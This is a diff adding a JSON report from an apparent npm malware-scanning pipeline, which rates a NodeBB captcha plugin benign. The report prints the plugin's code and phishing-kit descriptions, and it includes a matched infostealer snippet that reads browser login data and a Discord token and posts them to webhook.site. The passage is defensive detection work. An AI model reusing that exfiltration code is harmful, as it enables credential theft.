@@ -1,0 +1,558 @@
+{
+  "package_name": "nodebb-plugin-svg-captcha",
+  "package_version": "1.0.14",
+  "label": "benign",
+  "detection_time": "2026-05-26T19:25:13.234798",
+  "status": "success",
+  "selected_files_count": 7,
+  "selected_files": [
+    "package/package.json",
+    "package/commitlint.config.js",
+    "package/library.js",
+    "package/public/js/admin.js",
+    "package/public/js/register.js",
+    "package/public/js/scripts.js",
+    "package/upgrades/enable_stopforumspam_by_default.js"
+  ],
+  "is_malicious": false,
+  "total_files": 7,
+  "malicious_files": 0,
+  "total_slices": 1,
+  "malicious_slices": 0,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/commitlint.config.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/nodebb-plugin-svg-captcha/1.0.14/package/library.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "library_slice_1",
+          "code_snippet": "'use strict';\n\nconst util = require('util');\nconst path = require('path');\nvar svgCaptcha = require('svg-captcha-fixed');\n\nconst winston = require.main.require('winston');\nconst nconf = require.main.require('nconf');\nconst Meta = require.main.require('./src/meta');\nconst User = require.main.require('./src/user');\nconst Topics = require.main.require('./src/topics');\nconst db = require.main.require('./src/database');\n\nconst pluginData = require('./plugin.json');\n\n// let akismetClient;\n// let akismetCheckSpam;\n// let akismetSubmitSpam;\n// let akismetSubmitHam;\n\n// let honeypot;\nlet recaptchaArgs;\nlet svgcaptcha;\nlet pluginSettings;\n\nconst Plugin = module.exports;\n\npluginData.nbbId = pluginData.id.replace(/nodebb-plugin-/, '');\nPlugin.nbbId = pluginData.nbbId;\n\nPlugin.middleware = {};\n\nPlugin.middleware.isAdminOrGlobalMod = function (req, res, next) {\n\tUser.isAdminOrGlobalMod(req.uid, (err, isAdminOrGlobalMod) => {\n\t\tif (err) {\n\t\t\treturn next(err);\n\t\t}\n\t\tif (isAdminOrGlobalMod) {\n\t\t\treturn next();\n\t\t}\n\t\tres.status(401).json({ message: '[[spam-be-gone:not-allowed]]' });\n\t});\n};\n\nPlugin.middleware.checkStopForumSpam = function (req, res, next) {\n\tif (!pluginSettings.stopforumspamEnabled) {\n\t\treturn res.status(400).send({ message: '[[spam-be-gone:sfs-not-enabled]]' });\n\t}\n\n\tif (!pluginSettings.stopforumspamApiKey) {\n\t\treturn res.status(400).send({ message: '[[spam-be-gone:sfs-api-key-not-set]]' });\n\t}\n\tnext();\n};\n\nPlugin.load = async function (params) {\n\tconst settings = await Meta.settings.get(pluginData.nbbId);\n\tif (!settings) {\n\t\twinston.warn(`[plugins/${pluginData.nbbId}] Settings not set or could not be retrieved!`);\n\t\treturn;\n\t}\n\n\twinston.info(`[plugins/${pluginData.nbbId}] Settings loaded`);\n\tpluginSettings = settings;\n\n\tconst routeHelpers = require.main.require('./src/routes/helpers');\n\trouteHelpers.setupAdminPageRoute(params.router, `/admin/plugins/${pluginData.nbbId}`, params.middleware, [], Plugin.render);\n\n\tparams.router.post(\n\t\t`/api/user/:userslug/${pluginData.nbbId}/report`,\n\t\tPlugin.middleware.isAdminOrGlobalMod,\n\t\tPlugin.middleware.checkStopForumSpam,\n\t\tPlugin.report\n\t);\n\n\tparams.router.post(\n\t\t`/api/user/:username/${pluginData.nbbId}/report/queue`,\n\t\tPlugin.middleware.isAdminOrGlobalMod,\n\t\tPlugin.middleware.checkStopForumSpam,\n\t\tPlugin.reportFromQueue\n\t);\n};\n\nPlugin.render = async function (req, res) {\n\tlet akismet = await db.getObject(`${pluginData.nbbId}:akismet`);\n\takismet = { ...{ checks: 0, spam: 0 }, ...akismet };\n\tres.render(`admin/plugins/${pluginData.nbbId}`, {\n\t\tnbbId: pluginData.nbbId,\n\t\takismet,\n\t});\n};\n\n// report an existing user account\nPlugin.report = async function (req, res, next) {\n\ttry {\n\t\tconst uid = await User.getUidByUserslug(req.params.userslug);\n\t\tif (!uid) {\n\t\t\treturn next(new Error('[[error:no-user]]'));\n\t\t}\n\t\tconst [isAdmin, fields, ips] = await Promise.all([\n\t\t\tUser.isAdministrator(uid),\n\t\t\tUser.getUserFields(uid, ['username', 'email', 'uid']),\n\t\t\tUser.getIPs(uid, 0),\n\t\t]);\n\t\tif (isAdmin) {\n\t\t\treturn res.status(403).send({ message: '[[spam-be-gone:cant-report-admin]]' });\n\t\t}\n\t\tconst data = {\n\t\t\tip: ips[0],\n\t\t\temail: fields.email,\n\t\t\tusername: fields.username,\n\t\t};\n\t\tawait stopforumspam.submit(data, `Manual submission from user: ${req.uid} to user: ${fields.uid} via ${pluginData.id}`);\n\t\tres.status(200).json({ message: '[[spam-be-gone:user-reported]]' });\n\t} catch (err) {\n\t\twinston.error(`[plugins/${pluginData.nbbId}][report-error] ${err.message}`);\n\t\tres.status(400).json({ message: err.message || 'Something went wrong' });\n\t}\n};\n\n// report a user that is in the registration queue\nPlugin.reportFromQueue = async (req, res) => {\n\tconst data = await db.getObject(`registration:queue:name:${req.params.username}`);\n\tif (!data) {\n\t\tres.status(400).json({ message: '[[error:no-user]]' });\n\t}\n\tconst submitData = {\n\t\tip: data.ip,\n\t\temail: data.email,\n\t\tusername: data.username,\n\t};\n\ttry {\n\t\tawait stopforumspam.submit(submitData, `Manual submission from user: ${req.uid} to user: ${data.username} via ${pluginData.id}`);\n\t\tres.status(200).json({ message: '[[spam-be-gone:user-reported]]' });\n\t} catch (err) {\n\t\twinston.error(`[plugins/${pluginData.nbbId}][report-error] ${err.message}\\n${JSON.stringify(submitData, null, 4)}`);\n\t\tres.status(400).json({ message: err.message || 'Something went wrong' });\n\t}\n};\n\nPlugin.appendConfig = async (data) => {\n\treturn data;\n};\n\nPlugin.addCaptcha = function (data, callback) {\n\tif (pluginSettings && pluginSettings.svgcaptchaEnabled) {\n\t\tif (pluginSettings.svgcaptchaEnabled === 'svg') {\n\t\t\tsvgcaptcha = svgCaptcha.create({background: '#cc9966' });\n\t\t}\n\t\tif (pluginSettings.svgcaptchaEnabled === 'math') {\n\t\t\tsvgcaptcha = svgCaptcha.createMathExpr(\n\t\t\t\t{\n\t\t\t\t\tmathMin: 1,\n\t\t\t\t\tmathMax: 9,\n\t\t\t\t\tmathOperator: '+-',\n\t\t\t\t\tbackground: '#cc9966',\n\t\t\t\t}\n\t\t\t);\n\t\t}\n\t\tconsole.log(data.templateData);\n\t\tconst captcha = {\n\t\t\tlabel: 'Captcha',\n\t\t\thtml: `<div id=\"${pluginData.nbbId}-recaptcha-target\">`+svgcaptcha.data + '<input class=\"form-control\" type=\"text\" name=\"captcha\" required value=\"\">'+`</div>`,\n\t\t\tstyleName: pluginData.nbbId,\n\t\t};\n\t\tif (data.templateData) {\n\t\t\tdata.templateData.recaptchaArgs = recaptchaArgs;\n\t\t\tif (data.templateData.regFormEntry && Array.isArray(data.templateData.regFormEntry)) {\n\t\t\t\tdata.templateData.regFormEntry.push(captcha);\n\t\t\t} else if (Array.isArray(data.templateData.loginFormEntry)) {\n\t\t\t\tdata.templateData.loginFormEntry.push(captcha);\n\t\t\t} else {\n\t\t\t\tdata.templateData.captcha = captcha;\n\t\t\t}\n\t\t}\n\t}\n\tcallback(null, data);\n};\n\nPlugin.onPostEdit = async function (data) {\n\tconst cid = await Topics.getTopicField(data.post.tid, 'cid');\n\tawait Plugin.checkReply({\n\t\tcontent: data.post.content,\n\t\tuid: data.post.uid,\n\t\tcid: cid,\n\t\treq: data.req,\n\t}, { type: 'post' });\n\treturn data;\n};\n\nPlugin.onTopicEdit = async function (data) {\n\tawait Plugin.checkReply({\n\t\ttitle: data.topic.title || '',\n\t\tuid: data.topic.uid,\n\t\tcid: data.topic.cid,\n\t\treq: data.req,\n\t}, { type: 'topic' });\n\treturn data;\n};\n\nPlugin.onTopicPost = async function (data) {\n\tawait Plugin.checkReply(data, { type: 'topic' });\n\treturn data;\n};\n\nPlugin.onTopicReply = async function (data) {\n\tawait Plugin.checkReply(data, { type: 'post' });\n\treturn data;\n};\n\nPlugin.checkReply = async function (data, options) {\n\toptions = options || {};\n\t// http://akismet.com/development/api/#comment-check\n\tif (!akismetClient || !data || !data.req) {\n\t\treturn;\n\t}\n\tif (data.fromQueue) { // don't check if submitted from queue\n\t\treturn;\n\t}\n\tconst [isAdmin, isModerator, userData] = await Promise.all([\n\t\tUser.isAdministrator(data.req.uid),\n\t\tUser.isModerator(data.req.uid, data.cid),\n\t\tUser.getUserFields(data.req.uid, ['username', 'reputation', 'email']),\n\t]);\n\n\tif (isAdmin || isModerator) {\n\t\treturn;\n\t}\n\tconst akismetData = {\n\t\treferrer: data.req.headers.referer,\n\t\tuser_ip: data.req.ip,\n\t\tuser_agent: data.req.headers['user-agent'],\n\t\tpermalink: nconf.get('url').replace(/\\/$/, '') + data.req.path,\n\t\tcomment_content: (data.title ? `${data.title}\\n\\n` : '') + (data.content || ''),\n\t\tcomment_author: userData.username,\n\t\tcomment_author_email: userData.email,\n\t\t// https://github.com/akhoury/nodebb-plugin-spam-be-gone/issues/54\n\t\tcomment_type: options.type === 'topic' ? 'forum-post' : 'comment',\n\t};\n\n\tconst isSpam = await akismetCheckSpam(akismetData);\n\tawait db.incrObjectField(`${pluginData.nbbId}:akismet`, 'checks');\n\tif (!isSpam) {\n\t\treturn;\n\t}\n\tawait db.incrObjectField(`${pluginData.nbbId}:akismet`, 'spam');\n\n\tif (parseInt(userData.reputation, 10) >= parseInt(pluginSettings.akismetMinReputationHam, 10)) {\n\t\tawait akismetSubmitHam(akismetData);\n\t}\n\n\twinston.verbose(`[plugins/${pluginData.nbbId}] Post \"${akismetData.comment_content}\" by uid: ${data.req.uid} username: ${userData.username}@${data.req.ip} was flagged as spam and rejected.`);\n\tthrow new Error('Post content was flagged as spam by Akismet.com');\n};\n\nPlugin.checkRegister = async function (data) {\n\tawait Promise.all([\n\t\tPlugin._svgcaptchaCheck(data.req, data.userData),\n\t]);\n\treturn data;\n};\n\nPlugin.checkLogin = async function (data) {\n\tawait Plugin._svgcaptchaCheck(data.req, data.userData);\n\treturn data;\n};\n\nPlugin.getRegistrationQueue = async function (data) {\n\tif (pluginSettings.stopforumspamEnabled) {\n\t\tawait Promise.all(data.users.map(augmentWitSpamData));\n\t}\n\treturn data;\n};\n\nasync function augmentWitSpamData(user) {\n\t// temporary: see http://www.stopforumspam.com/forum/viewtopic.php?id=6392\n\ttry {\n\t\tuser.ip = user.ip.replace('::ffff:', '');\n\n\t\tlet body = await stopforumspam.isSpammer({ ip: user.ip, email: user.email, username: user.username, f: 'json' });\n\t\t// body === false, then just set the default non spam response,\n\t\t// which stopforumspam node module doesn't return it's spam, but some template rely on it\n\t\tif (!body) {\n\t\t\tbody = {\n\t\t\t\tsuccess: 1,\n\t\t\t\tusername: { frequency: 0, appears: 0 },\n\t\t\t\temail: { frequency: 0, appears: 0 },\n\t\t\t\tip: { frequency: 0, appears: 0, asn: null },\n\t\t\t};\n\t\t}\n\t\tuser.spamChecked = true;\n\t\tuser.spamData = body;\n\t\tuser.usernameSpam = body.username ? (body.username.frequency > 0 || body.username.appears > 0) : true;\n\t\tuser.emailSpam = body.email ? (body.email.frequency > 0 || body.email.appears > 0) : true;\n\t\tuser.ipSpam = body.ip ? (body.ip.frequency > 0 || body.ip.appears > 0) : true;\n\n\t\tuser.customActions = user.customActions || [];\n\t\tif (pluginSettings.stopforumspamApiKey) {\n\t\t\tuser.customActions.push({\n\t\t\t\ttitle: '[[spam-be-gone:report-user]]',\n\t\t\t\tid: `report-spam-user-${user.username}`,\n\t\t\t\tclass: 'btn-warning report-spam-user',\n\t\t\t\ticon: 'fa-flag',\n\t\t\t});\n\t\t}\n\t} catch (err) {\n\t\t// original nodebb core implementation did not pass the error to the cb, so im keeping it that way\n\t\t// https://github.com/NodeBB/NodeBB/blob/2cd1be0d041892742300a2ba2d5f1087b6272071/src/user/approval.js#L260-L264\n\t\tif (err) {\n\t\t\twinston.error(err);\n\t\t}\n\t}\n}\n\nPlugin.userProfileMenu = function (data, next) {\n\tif (pluginSettings.stopforumspamEnabled && pluginSettings.stopforumspamApiKey) {\n\t\tdata.links.push({\n\t\t\tid: 'spamBeGoneReportUserBtn',\n\t\t\troute: 'report-user',\n\t\t\ticon: 'fa-flag',\n\t\t\tname: '[[spam-be-gone:report-user]]',\n\t\t\tvisibility: {\n\t\t\t\tself: false,\n\t\t\t\tother: false,\n\t\t\t\tmoderator: false,\n\t\t\t\tglobalMod: true,\n\t\t\t\tadmin: true,\n\t\t\t},\n\t\t});\n\t}\n\tnext(null, data);\n};\n\nPlugin.onPostFlagged = async function (data) {\n\tconst flagObj = data.flag;\n\n\t// Don't do anything if flag is not for a post and not for \"spam\" reason\n\tif (flagObj.type !== 'post' || flagObj.description !== 'Spam') {\n\t\treturn;\n\t}\n\n\tif (akismetClient && pluginSettings.akismetFlagReporting &&\n\t\tparseInt(flagObj.reporter.reputation, 10) >= parseInt(pluginSettings.akismetFlagReporting, 10)) {\n\t\tconst [userData, permalink, ip] = await Promise.all([\n\t\t\tUser.getUserFields(flagObj.target.uid, ['username', 'email']),\n\t\t\tTopics.getTopicField(flagObj.target.tid, 'slug'),\n\t\t\tdb.getSortedSetRevRange(`uid:${flagObj.target.uid}:ip`, 0, 1),\n\t\t]);\n\n\t\t// todo: we don't have access to the req here :/\n\t\tconst submitted = {\n\t\t\tuser_ip: ip ? ip[0] : '',\n\t\t\tpermalink: `${nconf.get('url').replace(/\\/$/, '')}/topic/${permalink}`,\n\t\t\tcomment_author: userData.username,\n\t\t\tcomment_author_email: userData.email,\n\t\t\tcomment_content: flagObj.target.content,\n\t\t\tcomment_type: 'forum-post',\n\t\t};\n\t\ttry {\n\t\t\tawait akismetSubmitSpam(submitted);\n\t\t\twinston.info('Spam reported to Akismet.', submitted);\n\t\t} catch (err) {\n\t\t\twinston.error(`Error reporting to Akismet ${err.message}\\n${JSON.stringify(submitted, null, 4)}`);\n\t\t}\n\t}\n};\n\nPlugin._svgcaptchaCheck = async function (req, userData) {\n\tif (pluginSettings.svgcaptchaEnabled === 'svg' || pluginSettings.svgcaptchaEnabled === 'math') {\n\t\tif (svgcaptcha.text !== userData.captcha) {\n\t\t\tthrow new Error('Captcha not verified, are you a robot?');\n\t\t} else {\n\t\t\treturn true;\n\t\t}\n\t}\n};\n\n\n\nPlugin.admin = {\n\tmenu: function (custom_header, callback) {\n\t\tcustom_header.plugins.push({\n\t\t\troute: `/plugins/${pluginData.nbbId}`,\n\t\t\ticon: pluginData.faIcon,\n\t\t\tname: pluginData.name,\n\t\t});\n\t\tcallback(null, custom_header);\n\t},\n};",
+          "is_malicious": false,
+          "malice_score": 0.4406589408715566,
+          "confidence": 0.1,
+          "behavior_summary": "Upon receiving HTTP requests to report users, the code accesses user data (IP addresses, emails, usernames) via internal APIs and submits this data to the StopForumSpam service using its API. It also integrates with Akismet's spam detection API to check and report spam content on posts and topics, incrementing counters in the database and conditionally submitting ham or spam reports. Captcha verification is performed using svg-captcha to prevent automated abuse. The code modifies user profile menus and registration queues by augmenting user data with spam check results from StopForumSpam. These operations involve network communication with external spam detection services, enabling spam detection, reporting, and user moderation within the forum platform.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a NodeBB forum plugin designed to integrate spam detection and reporting features using legitimate external services such as StopForumSpam and Akismet. It performs user spam reporting, spam checks on posts and topics, captcha verification, and augments user data with spam-related metadata. There is no evidence of obfuscation, data exfiltration to attacker-controlled endpoints, credential theft, or anti-analysis evasion techniques. The use of captcha and spam detection APIs is consistent with legitimate anti-spam moderation tools. Although it communicates with external services, these are well-known spam detection providers, and the data shared (user IPs, emails, usernames) is expected in this context for spam prevention. The code does not match the key malicious indicators from the knowledge base examples, which involve phishing, credential stealing, or anti-analysis evasion.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_133826_960330_snippet_4",
+              "source_package": "Greatness (N/A (Phishing-as-a-Service toolkit, not a package manager ecosystem))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133826_960330/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4713839888572693,
+              "code_similarity": 0.37104228138923645,
+              "behavior_similarity": 0.5717257261276245,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "Anti-bot and anti-analysis logic: CAPTCHA display on phishing page, QR code generation in PDF attachments, error handling for invalid data, and detection of automated analysis environments (e.g., headless browsers, sandbox artifacts). The code alters behavior or blocks access if analysis is detected.",
+                "code_behavior": "On page load or form submission, the code displays CAPTCHAs to block automated tools, generates QR codes in PDF attachments that link to the phishing site, and checks for signs of automated analysis or sandbox environments, modifying or blocking page behavior if such conditions are detected.",
+                "malice_analysis": {
+                  "why_suspicious": "Anti-analysis and evasion techniques are used to avoid detection by security tools and to ensure only real users interact with the phishing kit.",
+                  "violated_expectations": "Legitimate login pages do not attempt to detect sandboxes, block automated analysis, or combine CAPTCHAs with evasion logic targeting security researchers.",
+                  "similar_legitimate_use": "CAPTCHAs are used for anti-bot protection in legitimate sites, but not in combination with anti-analysis or sandbox detection logic.",
+                  "key_indicators": [
+                    "CAPTCHA implementation on phishing login page",
+                    "QR code in PDF leading to phishing domain",
+                    "JavaScript checks for headless browsers, automation, or sandbox artifacts",
+                    "Conditional logic to alter or block page behavior if analysis is detected"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "user-interaction (page load or form submission on phishing site or document)",
+                  "file_location": "phishing website JavaScript, PDF attachment scripts",
+                  "required_permissions": [
+                    "network",
+                    "JavaScript execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Greatness",
+                  "package_manager": "N/A (Phishing-as-a-Service toolkit, not a package manager ecosystem)",
+                  "package_versions": "All versions since 2022 (continuously updated)",
+                  "why_malicious": "Greatness is a Phishing-as-a-Service (PhaaS) toolkit specifically designed to facilitate credential theft campaigns targeting Microsoft 365 users. It enables attackers to easily deploy highly convincing phishing pages that mimic Microsoft 365 login portals, bypass multi-factor authentication (MFA) using adversary-in-the-middle (AiTM) techniques, and evade detection through advanced anti-analysis and anti-bot features. The toolkit automates credential harvesting, session cookie theft, and exfiltration via multiple channels, significantly lowering the technical barrier for large-scale, effective phishing attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim receives phishing email containing a malicious HTML attachment, a PDF with an embedded QR code, or a direct phishing URL.",
+                    "implemented_by": [],
+                    "leads_to": "Victim opens the phishing page or scans the QR code, initiating the attack."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Phishing page loads obfuscated JavaScript, reconstructs a fake Microsoft 365 login form, and executes anti-analysis logic to evade detection.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_4"
+                    ],
+                    "leads_to": "Victim is presented with a convincing login interface and enters credentials."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Entered credentials are encrypted and exfiltrated to the attacker's backend server and/or sent to an attacker-controlled Telegram chat.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Victim is prompted for MFA, and attacker prepares to intercept authentication."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Adversary-in-the-Middle (AiTM) logic intercepts the MFA prompt, relays it to the legitimate Microsoft 365 service, and captures the resulting session cookie.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker gains access to the victim's Microsoft 365 account using the stolen session cookie."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Obfuscated JavaScript dynamically loading external libraries on login pages",
+                    "Base64-encoded HTML or JavaScript content in attachments or web pages",
+                    "AJAX requests with AES-encrypted payloads and JWTs containing Base64-encoded timestamps",
+                    "CAPTCHA or QR code in PDF attachments leading to credential input forms",
+                    "JavaScript checks for headless browsers, automation, or sandbox artifacts",
+                    "Network requests to Telegram API from web pages",
+                    "Proxying of authentication flows and session cookie capture"
+                  ],
+                  "file_indicators": [
+                    "HTML attachments mimicking Microsoft 365 login pages with obfuscated JavaScript",
+                    "PDF files with embedded QR codes linking to suspicious or non-corporate domains",
+                    "JavaScript files containing Base64-encoded content and anti-analysis logic"
+                  ],
+                  "network_indicators": [
+                    "AJAX POST requests to non-Microsoft domains after credential entry",
+                    "Outbound HTTPS connections to api.telegram.org from browser sessions",
+                    "Phishing domains mimicking Microsoft 365 or eFax services, often with typosquatting or lookalike characteristics"
+                  ],
+                  "how_to_detect": "Monitor inbound emails for HTML or PDF attachments containing QR codes or links to non-corporate domains. Analyze web traffic for obfuscated JavaScript, Base64-encoded content, and AJAX requests with encrypted payloads or JWTs. Flag browser-originated network connections to Telegram API endpoints (api.telegram.org). Detect proxying of authentication flows and session cookie exfiltration by inspecting for reverse proxy behavior and anomalous session token handling. Use sandboxing to identify anti-analysis logic, such as CAPTCHAs combined with environment checks, on suspicious login pages."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113641_174600_snippet_2",
+              "source_package": "MUT-8694 (multiple typosquatted packages) (npm, PyPI)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_113641_174600/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.4314914345741272,
+              "code_similarity": 0.4263637959957123,
+              "behavior_similarity": 0.4366190433502197,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// JavaScript (Blank Grabber/Skuld Stealer core logic)\nconst fs = require('fs');\nconst https = require('https');\nconst token = process.env.DISCORD_TOKEN;\nfs.readFile(process.env.APPDATA + '/User Data/Default/Login Data', (err, data) => {\n  if (!err) {\n    const options = {\n      hostname: 'webhook.site',\n      path: '/unique-id',\n      method: 'POST',\n      headers: {'Content-Type': 'application/octet-stream'}\n    };\n    const req = https.request(options);\n    req.write(data);\n    req.end();\n  }\n});",
+                "code_behavior": "At runtime, the code reads sensitive files such as browser login data and environment variables like DISCORD_TOKEN, then exfiltrates this data via HTTPS POST to a remote webhook endpoint controlled by the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses credential stores and environment variables containing sensitive information, then transmits this data to an external server, which is a hallmark of infostealer malware.",
+                  "violated_expectations": "Legitimate packages should not access or transmit user credentials or sensitive files without explicit user consent and clear justification.",
+                  "similar_legitimate_use": "Security auditing tools may access such files, but only with user awareness, explicit permission, and for legitimate security purposes.",
+                  "key_indicators": [
+                    "Access to credential stores (browser login data, environment tokens)",
+                    "Exfiltration of data to webhook.site or similar endpoints",
+                    "Use of environment variables for sensitive data extraction",
+                    "Network transmission of credential data without user consent"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "payload.exe (delivered by the package)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "MUT-8694 (multiple typosquatted packages)",
+                  "package_manager": "npm, PyPI",
+                  "package_versions": "all published versions of the malicious typosquatted packages",
+                  "why_malicious": "The packages are part of a coordinated supply chain attack campaign leveraging typosquatting to impersonate legitimate libraries. Upon installation or import, they download and execute infostealer malware (such as Blank Grabber and Skuld Stealer) designed to exfiltrate sensitive data, including credentials and tokens, from infected systems. The packages attempt to appear trustworthy by referencing legitimate tools and use external platforms (GitHub, repl.it) to host and deliver malicious payloads, primarily targeting Windows users."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or imports the malicious typosquatted package, triggering the download and execution of a remote payload.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Initial payload download and execution on the victim's system"
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious payload (infostealer) is executed, establishing persistence and preparing to steal sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and data theft capabilities are enabled"
+                  },
+                  {
+                    "step": 3,
+                    "action": "The infostealer accesses sensitive files and environment variables, exfiltrating the stolen data to attacker-controlled endpoints.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker receives stolen credentials and sensitive information from the victim's system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Package downloads and executes remote code at import-time or during installation",
+                    "Access to credential stores (browser login data, environment tokens) by package or payload code",
+                    "Exfiltration of sensitive data to external endpoints such as webhook.site, GitHub, or repl.it"
+                  ],
+                  "file_indicators": [
+                    "setup.py or __init__.py containing remote code download and execution logic",
+                    "Unexpected executable files (e.g., payload.exe, malware.py) created during package installation or import",
+                    "References to external code hosting platforms (GitHub, repl.it) in package source code"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to raw.githubusercontent.com for payload downloads",
+                    "Connections to webhook.site or similar data collection endpoints for exfiltration",
+                    "Downloads from repl.it or other code hosting services during installation or import"
+                  ],
+                  "how_to_detect": "Monitor for packages that initiate network connections to code hosting or data exfiltration endpoints during installation or import. Flag any package that downloads and executes remote code, accesses credential stores, or references known infostealer infrastructure. Use static analysis to detect suspicious import-time or setup.py logic, and dynamic analysis to observe unexpected network or filesystem activity during package installation or import. Correlate creation of unexpected executables and outbound connections to known malicious infrastructure."
+                }
+              }
+            },
+            {
+              "match_id": "20240708_171640_058672_snippet_2",
+              "source_package": "Greatness (N/A (Phishing-as-a-Service toolkit, not a traditional package manager))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171640_058672/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.42155927419662476,
+              "code_similarity": 0.371968150138855,
+              "behavior_similarity": 0.47115039825439453,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "if (isBot() || !verifyCaptcha()) { window.location = 'error.html'; }",
+                "code_behavior": "On page load, the script evaluates the visitor using bot-detection logic and CAPTCHA verification, and if a bot or automated analysis is detected, it redirects the session to an error page, thereby evading automated security tools.",
+                "malice_analysis": {
+                  "why_suspicious": "The presence of explicit anti-bot and anti-analysis logic is a common tactic in phishing kits to avoid detection by automated security scanners and sandboxes.",
+                  "violated_expectations": "Legitimate sites may use CAPTCHAs to prevent abuse, but do not specifically target security analysis environments for redirection or blocking.",
+                  "similar_legitimate_use": "CAPTCHAs are used to prevent automated abuse, but not to evade security research or block analysis tools.",
+                  "key_indicators": [
+                    "Custom bot-detection functions (e.g., isBot())",
+                    "Conditional redirection to error pages based on environment checks",
+                    "CAPTCHA logic tied to anti-analysis rather than user validation"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "page load (anti-bot/anti-analysis)",
+                  "file_location": "inline JavaScript in phishing HTML or dynamically loaded JS file",
+                  "required_permissions": [
+                    "browser session",
+                    "network"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Greatness",
+                  "package_manager": "N/A (Phishing-as-a-Service toolkit, not a traditional package manager)",
+                  "package_versions": "All versions since 2022 (continuously updated)",
+                  "why_malicious": "Greatness is a Phishing-as-a-Service toolkit explicitly designed to facilitate credential theft by mimicking Microsoft 365 login pages, intercepting multi-factor authentication (MFA) codes, and employing advanced evasion techniques such as JavaScript obfuscation, anti-bot logic, dynamic content loading, and encrypted exfiltration. Its sole purpose is to enable unauthorized access to Microsoft 365 accounts by stealing user credentials and session data."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Victim receives a phishing email or PDF containing a QR code that directs them to a malicious login page designed to mimic Microsoft 365.",
+                    "implemented_by": [],
+                    "leads_to": "Victim visits the phishing site."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Phishing site loads obfuscated and dynamically loaded JavaScript, implements anti-bot and CAPTCHA evasion to avoid automated detection.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_5"
+                    ],
+                    "leads_to": "Victim is presented with a fake Microsoft 365 login page."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Victim enters credentials and MFA code into the fake login form, which captures and prepares the data for exfiltration.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credentials and MFA code are captured by the phishing kit."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Captured credentials and MFA code are encrypted, packaged with a JWT, and exfiltrated to the attacker's server using AJAX POST requests.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker receives credentials and session data."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Attacker is notified via Telegram bot of new stolen credentials, enabling rapid exploitation.",
+                    "implemented_by": [
+                      "snippet_6"
+                    ],
+                    "leads_to": "Attacker uses credentials and session cookie to access the victim's Microsoft 365 account."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Phishing pages that closely mimic Microsoft 365 login, capturing both credentials and MFA codes",
+                    "Obfuscated JavaScript with dynamic loading of additional code from non-standard or attacker-controlled domains",
+                    "Use of CAPTCHA and custom anti-bot logic to evade automated security analysis and sandboxes",
+                    "AJAX POST requests containing encrypted payloads (e.g., AES-encrypted JSON) sent to unknown or non-Microsoft endpoints after credential input",
+                    "Outbound HTTP requests to the Telegram Bot API (api.telegram.org) containing credential data for attacker notification"
+                  ],
+                  "file_indicators": [
